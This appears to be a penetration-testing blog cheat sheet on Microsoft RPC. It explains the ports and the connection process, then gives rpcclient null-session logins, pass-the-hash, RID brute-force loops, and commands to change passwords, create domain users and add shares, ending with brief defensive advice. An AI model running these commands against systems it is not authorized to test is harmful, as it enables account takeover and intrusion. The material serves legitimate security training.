+++
title = "Attacking RPC: Deep Dive & Cheat Sheet"
draft = false
tags = ["Pentesting", "RPC", "CheatSheet"]
keywords = ["RPC enumeration", "Remote Procedure Call exploitation", "RPC client attacks", "RPC security", "RPC authentication", "RPC over HTTP", "RPC port scanning", "RPC vulnerability assessment", "RPC protocol analysis", "RPC attack techniques"]
description = "A comprehensive guide to RPC enumeration, exploitation, and security. Learn about RPC client attacks, port scanning, authentication methods, and best practices for securing RPC implementations in enterprise environments."
author = "bloodstiller"
date = 2024-10-16
toc = true
bold = true
next = true
+++

## Introduction {#introduction}

RPC (Remote Procedure Call) is a protocol that allows a program to execute a procedure or function on another computer as if it were a local call. This cheat sheet provides a comprehensive overview of RPC, including its functionality, security implications, and relevance to penetration testing.


## Port Number(s): {#port-number--s}

-   **RPC (Remote Procedure Call) does not operate on a specific port itself**.
    -   Instead, it relies on underlying protocols to establish connections and transfer data.
    -   RPC uses different ports to facilitate communication between systems and services. Here's a summary of the key ports involved:

-   **Port** `135` (`TCP/UDP`):
    -   Purpose: Endpoint Mapper (EPM) for Microsoft RPC.
    -   Description: Acts as a directory service to map service requests to the appropriate dynamically assigned ports.

-   **Dynamic Ports** (`TCP/UDP`):
    -   **Purpose**: RPC services can use dynamically assigned ports.
    -   **Description**: After an initial connection via port 135, RPC services typically assign dynamic ports in the range of 49152–65535.
    -   +Note+: The dynamic port range may differ depending on the OS and configuration.

-   **Port** `593` (`TCP`):
    -   **Purpose**: HTTP RPC (RPC over HTTP).
    -   **Description**: Allows RPC communication over HTTP for remote management tasks.
    -   **Usage**: Can be used to bypass firewalls that block traditional RPC ports.
    -   **Benefits**: Useful for remote management in environments where direct RPC access is restricted.
    -   **Enumeration**: Can be enumerated using tools like Nmap with appropriate scripts.

-   **Port** `80` (`TCP`) and **Port** `443` (`TCP`):
    -   **Purpose**: Standard HTTP and HTTPS ports, which can be used for RPC over HTTP(S).
    -   **Description**: When configured, allows RPC traffic to be tunneled through standard web protocols.
    -   **Usage**: Commonly used in scenarios where traditional RPC ports are blocked by firewalls.


### RPC over HTTP: {#rpc-over-http}

-   RPC over HTTP (Port 593) can be used to bypass firewalls that block traditional RPC ports.
-   Useful for remote management in environments where direct RPC access is restricted.
-   Can be enumerated using tools like Nmap with appropriate scripts.


## RPC Connection Process (Deep Dive): {#rpc-process--deep-dive}


### Connection: {#connection}

1.  **Client initiates a request to the server**:
    -   Client prepares the procedure name and parameters.
    -   Client stub is invoked, which acts as a proxy for the remote procedure.

2.  **Parameters are marshalled (serialized) for transmission**:
    -   Data is converted into a standardized format (e.g., XDR, Protocol Buffers).
    -   Complex data structures are flattened into a byte stream.

3.  **Request is sent over the network**:
    -   The marshalled data is packaged with metadata (e.g., procedure ID, version).
    -   Transmission occurs using the underlying network protocol (e.g., TCP/IP).


### Execution: {#execution}

1.  **Server receives and unmarshalls the request**:
    -   Server stub receives the incoming request.
    -   Data is deserialized back into a format the server can process.

2.  **Server executes the requested procedure**:
    -   The appropriate local procedure is identified and called.
    -   Server performs the requested operation with the provided parameters.


### Response {#response}

1.  **Results are marshalled and sent back to the client**:
    -   Output data is serialized for network transmission.
    -   Response is packaged with any necessary metadata.

2.  **Client unmarshalls and processes the results**:
    -   Client stub receives and deserializes the response.
    -   Data is presented to the client application in the expected format.


## +Enumerating RPC+ {#befb8b}


-   You can see some of these enumeration steps performed on my walkthrough's for Cascade & Fuse: 
    -   https://bloodstiller.com/walkthroughs/cascade-box 
    -   https://bloodstiller.com/walkthroughs/fuse-box 

### Enumerating RPC using RPCclient: {#enumerating-rpc-using-rpcclient}

-   **Remember we can pass the pash with** `rpcclient` **too**:
    -   `--pw-nt-hash <hash>`

-   <span class="underline">+Note+: Sometimes not all command are available due to restrictions</span>



#### Connecting with rpcclient using a null/anonymous session: {#connecting-with-rpcclient-using-a-null-anonymous-session}

```bash
rpcclient -U "" [ip]
rpcclient -U '%' [ip]
```
-   Try both of these one may work and the other may not



#### Enumerating users using rpcclient: {#enumerating-users-using-rpcclient}
```shell
# Enumerates domain users: 
enumdomusers
```
-   +Note+: 
    -   We will be given the users RID which can then be used with `queryuser` to enumerate further.
    -   This provides similar information to LDAP including Description etc

```shell
#Query the user RID we have just found above:
queryuser [RID]
#Example
queryuser 0x3e8
```
-   +Note+:
    -   Used with the RID discovered with `enumdomusers` above to enumerate users.
    -   We can then get the +RID of the group+ to then user the `querygroup` command.


#### Enumerating Domain &amp; Local Groups with rpcclient: {#enumerating-domain-and-local-groups-with-rpcclient}

<!--list-separator-->

##### Enumerating Domain alias groups:
```bash
#Domain alias Groups:
enumalsgroups domain

#Local Groups:
enumalsgroups builtin
```

-   **Alias Groups Explanation**:
    -   Alias Groups (Local Groups):
        -   These groups are local to the machine or server, or specific to the domain controller but aren't part of the global domain groups.
        -   Alias groups often correspond to built-in groups on Windows (e.g., Administrators, Backup Operators), but they can also be domain-specific local groups.
        -   Alias groups can only contain members from the local domain.

-  **Scope**:
            -   `enumalsgroups domain/builtin`: Lists local alias groups that are specific to the domain controller or server.

<!--list-separator-->

##### Enumerating Domain Wide Groups:
```bash
#Domain Wide Groups:
enumdomgroups

#Query the group of the user above:
querygroup [GroupRID]

#Example
querygroup 0x201
```
-   **Scope**:
    -   `enumdomgroups`: Lists domain-wide groups that are used across the Active Directory domain.


#### Further Enumeration Using rpcclient: 
```bash
# Enumerating the whole domain: 
enumdomains

# Enumerate System privileges:
enumprivs

# Retrieve Information about Available Services using rpcclient: 
querydispinfo

# Enumerate Domain Groups using rpcclient: 
enumdomgroups

# Resolve SIDs to Names using rpcclient: 
lookupsids [SID]

# Enumerate System Privileges using rpcclient: 
enumprivs

# Enumerate Shared Resources using rpcclient: 
netshareenum

# List Detailed Information about Shared Resources using rpcclient: 
netshareenumall

# Retrieve Information about a Specific Share using rpcclient: 
netsharegetinfo [sharename]

# Create a New Share using rpcclient: 
netshareadd "C:\path" "sharename" [type] "Description"

# Enumerate Trusted Domains using rpcclient: 
enumtrustdoms

# Enumerate Printers
enumprinters
```
- I used `enumprinters` in the HTB box Fuse to reveal a cleartext credential: 
  -  https://bloodstiller.com/walkthroughs/fuse-box/



#### Enumerate Password Policy using rpcclient: {#enumerate-password-policy-using-rpcclient}

-   **Command**: `enumdompwinfo`
-   +Example output+:
    ```shell
    rpcclient $> getdompwinfo
    min_password_length: 5
    password_properties: 0x00000000
    ```

<!--list-separator-->

-  Understanding `password_properties`:

    -   `password_properties` is a bitmask, where different bits control specific password policies.

    -   **Here are the common flags and what each bit represents**:
        -   **Hex Value**: `0x00000001`
        -   **Flag**: `DOMAIN_PASSWORD_COMPLEX`
        -   **Meaning**: Enforces password complexity (requires uppercase, lowercase, digits, symbols)

        -   **Hex Value**: `0x00000002`
        -   **Flag**: `DOMAIN_PASSWORD_NO_ANON_CHANGE`
        -   **Meaning**: Prevents anonymous users from changing passwords

        -   **Hex Value**: `0x00000004`
        -   **Flag**: `DOMAIN_PASSWORD_NO_CLEAR_CHANGE`
        -   **Meaning**: Prevents passwords from being sent in cleartext

        -   **Hex Value**: `0x00000008`
        -   **Flag**: `DOMAIN_LOCKOUT_ADMINS`
        -   **Meaning**: Locks out administrators as well when lockout occurs

        -   **Hex Value**: `0x00000010`
        -   **Flag**: `DOMAIN_PASSWORD_STORE_CLEARTEXT`
        -   **Meaning**: Allows storing passwords using reversible encryption (cleartext)

        -   **Hex Value**: `0x00000020`
        -   **Flag**: `DOMAIN_REFUSE_PASSWORD_CHANGE`
        -   **Meaning**: Prevents users from changing their password

        -   **Hex Value**: `0x00000000`
        -   **Meaning**: Means that none of these password restrictions are enabled.

```shell
# Enumerate Specific User Password Policy using rpcclient: 
getusrdompwinfo [UserRID]
getusrdompwinfo 0x46f

```

#### Searching for custom RID's using rpcclient: {#searching-for-custom-rid-s-using-rpcclient}

-   **Bruteforce Custom User** `RID's` **with forloop**:
    -   **Command**: 
``` shell
for i in $(seq 500 1100); do 
    rpcclient -N -U "" [box] -c "queryuser 0x$(printf '%x\n' $i)" | \
    grep "User Name\|user_rid\|group_rid" && echo ""
done
```

-   +Note+:
    -   This is used for searching for custom RIDs (see below)
    -   The values `500` &amp; `1100` can be modified.

##### Explanation of the Command:

 -   `Loop (for i in $(seq 500 1100))`:
     -   The loop iterates over a range of values `(500 to 1100)`, converting each value to a hexadecimal format (`via printf '%x\n' $i`) because RIDs are expressed in hexadecimal.

 -   `rpcclient -N -U "" <ip>`:
     -   `-N`: Specifies no password, used for anonymous connections.
     -   `-U ""`: Attempts the connection without a username.
     -   `[ip]`: The IP address of the target server.

 -   `queryuser 0x<rid>`:
        -   Queries user information based on the given RID (Relative Identifier) from the current iteration of the loop, formatted as a hexadecimal value (e.g., 0x1f4 for RID 500).

 -   `grep "User Name\|user_rid\|group_rid"`:
     -   Filters the output to display only lines containing user name, user RID, or group RID for easier readability.



<!--list-separator-->

##### Why `RID` Stop Around `500`:
-   **Default RIDs in Windows**:

    -   The first `500` RIDs are typically reserved for well-known or default accounts and groups in Windows systems. For example:
        -   `0x1f4` (500 in decimal) is often assigned to the Administrator account.
        -   `0x1f5` (501) is the Guest account.
        -   Other default users and built-in groups (e.g., Administrators group, Users group) are typically assigned RIDs in this range.
    -   **Custom** `RIDs`:
        -   RIDs above 500 are typically assigned to custom-created users and groups. When administrators create new users or groups, the system automatically assigns them higher RIDs, which is why your search starts at 500 and extends up to 1100 in this case. This range is where you would expect to find custom user accounts or groups.

    -   **Purpose of the Command**:
        -   Search for Custom User RIDs:
            -   Since the well-known accounts usually stop around 500, we are searching through RIDs in the 500 to 1100 range, which is where custom-created users or groups are likely to have RIDs.
            -   This method can be useful in penetration testing or during enumeration to discover non-default user accounts that have been created on the system, particularly when we don't have a complete list of users.

<!--list-separator-->

### Enumerating RPC using rpcinfo: {#enumerating-rpc-using-rpcinfo}

```bash
rpcinfo [ip/url]
rpcinfo 10.129.203.101
```


### Enumerating RPC using Nmap: {#enumerating-rpc-using-nmap}
```bash
nmap -p 135 --script=msrpc-enum [target]
nmap -p 135 --script=rpc-grind [target]
```
-   +Note+: These Nmap scripts can provide valuable information about RPC services and endpoints.


### Enumerating RPC using impacket-rpcdump: {#enumerating-rpc-using-impacket-rpcdump}
```shell
impacket-rpcdump [domain/]username[:password]@target
impacket-rpcdump ./Administrator:password123@192.168.1.100
```
-   +Note+: This tool can enumerate RPC endpoints and provide detailed information about available interfaces.


## +Attacking RPC+ {#16c913}


### Attacking RPC using `rpcclient`: {#attacking-rpc-using-rpcclient}

-   **Remember we can pass the pash with** `rpcclient` **too**:
    -   `--pw-nt-hash <hash>`


#### Change a users password using rpcclient: {#change-a-users-password-using-rpcclient}
```bash
chgpasswd3 [user] [oldPass] [newPass]
chgpasswd3 n.barley wellbum wellbum14
```


#### Create a new user using rpcclient: {#create-a-new-user-using-rpcclient}

-   **Create a new user on the remote Windows system using** `rpcclient` *with the* `createdomuser` **username command**:

```bash
createdomuser [username]
setuserinfo2 username 24 [NewPassword]
```
-   +Note+:
    -   In this example, the `24` value represents necessary Windows information class constant to set a user password.
    -   The value will always be `24` when setting a password.


#### Create a new share using rpcclient: {#create-a-new-share-using-rpcclient}

```bash
netshareadd "C:\[FolderToShare]" "[NameOfShare]" [ShareType] "[ShareDescription]"
netshareadd "C:\Windows" "Windows" 10 "Windows Share"
```

-   +Note+:
    -   `10`: This is the share type. The value 10 indicates that it is a disk drive. Other values can represent different types of shares (e.g., printers).


#### Remove a Shared Resource using rpcclient: {#remove-a-shared-resource-using-rpcclient}
```bash
netshareremove [sharename]
```


## Defending RPC {#6dca67}

-   Implement strong authentication and authorization
-   Use encryption for data in transit (e.g., TLS)
-   Regularly update and patch RPC services
-   Implement proper input validation and sanitization
-   Use firewalls and network segmentation to control RPC traffic
-   Monitor and log RPC activities for suspicious behavior


### Common RPC Vulnerabilities: {#common-rpc-vulnerabilities}

-   Buffer Overflows: Especially in older systems or poorly implemented RPC services.
-   Null Session Attacks: When anonymous access is allowed.
-   RPC Amplification Attacks: Used in DDoS scenarios.
-   Improper Access Controls: Leading to unauthorized access to RPC functions.



## RPC Protocol Information: {#rpc-information}

### RPC Filtering: {#rpc-filtering}

-   Windows systems often implement RPC filtering to restrict access.
-   Can be configured through Group Policy or Windows Firewall with Advanced Security.

### Definition: {#definition}

-   A protocol for executing code on a remote server.


### Components: {#components}

-   **Client**: Sends the request.
-   **Server**: Executes the function and returns a result.


### Types: {#types}

1.  **Synchronous RPC**: Client waits for the server to respond.
2.  **Asynchronous RPC**: Client continues operation without waiting.


### Protocols: {#protocols}

-   XML-RPC
-   JSON-RPC
-   gRPC


### Common Uses: {#common-uses}

-   Distributed computing
-   Web services
-   APIs


### Advantages: {#advantages}

-   Simplifies development of distributed applications
-   Allows for heterogeneous environments (different languages/platforms)
-   Can improve performance in certain scenarios


### Disadvantages: {#disadvantages}

-   Can introduce network-related complexities
-   Potential security risks if not properly implemented
-   May have higher latency compared to local procedure calls


### Implementation Considerations: {#implementation-considerations}

-   Error handling for network issues
-   Version compatibility between client and server
-   Security measures (authentication, encryption)
-   Performance optimization (caching, connection pooling)


### Security Concerns: {#security-concerns}

-   Unauthorized access
-   Data interception
-   Denial-of-service attacks


### Relevance to Penetration Testing: {#relevance-to-penetration-testing}

-   Can be used to enumerate Active Directory environments.
-   Enumeration of exposed functions
-   Injection vulnerabilities
-   Insecure data transmission


### Common RPC Frameworks: {#common-rpc-frameworks}

-   gRPC (Google)
-   Apache Thrift
-   XML-RPC
-   JSON-RPC
-   Java RMI (Remote Method Invocation)


## RPC vs. REST {#rpc-vs-dot-rest}


### RPC: {#rpc}

-   Function-centric: Focuses on actions and procedures
-   Typically uses POST method for all operations
-   Often uses a single endpoint
-   Can be more efficient for complex operations


### REST: {#rest}

-   Resource-centric: Focuses on data entities
-   Uses different HTTP methods (GET, POST, PUT, DELETE)
-   Uses multiple endpoints based on resources
-   Generally simpler and more widely used for web APIs


## Further Reading {#further-reading}

-   [Microsoft RPC Documentation](<https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page>)
-   [gRPC Documentation](<https://grpc.io/docs/>)
-   [OWASP Web Service Security Cheat Sheet](<https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html>)
